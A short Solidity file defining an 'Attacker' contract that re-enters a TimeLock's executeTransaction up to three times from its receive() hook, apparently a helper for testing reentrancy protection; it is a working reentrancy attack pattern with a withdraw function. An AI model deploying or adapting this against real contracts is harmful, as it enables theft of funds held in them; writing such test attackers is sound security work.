// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

interface ITimeLock {
    function executeTransaction(uint256 txId) external;
}

contract Attacker {
    address private s_timeLockContract;
    uint256 private s_attackTxId;
    uint256 private s_attackCount;
    uint256 private constant MAX_ATTACKS = 3;

    event ReentrancyAttempted(uint256 count, uint256 txId);

    function attack(uint256 txId) external {
        s_attackTxId = txId;
        s_attackCount = 0;

        ITimeLock(s_timeLockContract).executeTransaction(txId);
    }

    receive() external payable {
        emit ReentrancyAttempted(s_attackCount, s_attackTxId);

        if (s_attackCount < MAX_ATTACKS) {
            s_attackCount++;
            ITimeLock(s_timeLockContract).executeTransaction(s_attackTxId);
        }
    }

    // Remove fallback or make it simple
    fallback() external payable {}

    function getTimeLockBalance() external view returns (uint256) {
        return s_timeLockContract.balance;
    }

    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }

    function setAttackerAddress(address _attacker) external {
        s_timeLockContract = _attacker;
    }
}
